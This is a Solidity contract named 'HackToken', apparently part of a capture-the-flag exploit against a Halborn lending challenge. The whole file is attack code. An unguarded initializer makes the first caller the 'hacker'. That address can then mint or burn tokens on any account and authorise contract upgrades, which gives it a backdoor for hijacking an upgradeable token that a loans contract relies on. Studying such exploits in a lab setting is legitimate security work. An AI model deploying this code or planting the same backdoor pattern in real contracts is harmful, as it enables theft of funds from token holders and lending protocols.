// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {ERC20Upgradeable} from "openzeppelin-contracts-upgradeable/contracts/token/ERC20/ERC20Upgradeable.sol";
import {Initializable} from "openzeppelin-contracts-upgradeable/contracts/proxy/utils/Initializable.sol";
import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/proxy/utils/UUPSUpgradeable.sol";
import {OwnableUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/access/OwnableUpgradeable.sol";
import {MulticallUpgradeable} from "../libraries/Multicall.sol";

contract HackToken is
    Initializable,
    ERC20Upgradeable,
    UUPSUpgradeable,
    OwnableUpgradeable
{
    address public halbornLoans;

    address public hackerAddress;

    modifier onlyHacker() {
        require(msg.sender == hackerAddress, "Caller is not the hacker");
        _;
    }

    function initialize() external {
        hackerAddress = msg.sender;
    }

    function setLoans(address halbornLoans_) external onlyHacker {
        require(halbornLoans_ != address(0), "Zero Address");
        halbornLoans = halbornLoans_;
    }

    function mintToken(address account, uint256 amount) external onlyHacker {
        _mint(account, amount);
    }

    function burnToken(address account, uint256 amount) external onlyHacker {
        _burn(account, amount);
    }

    function _authorizeUpgrade(address) internal override onlyHacker {}
}
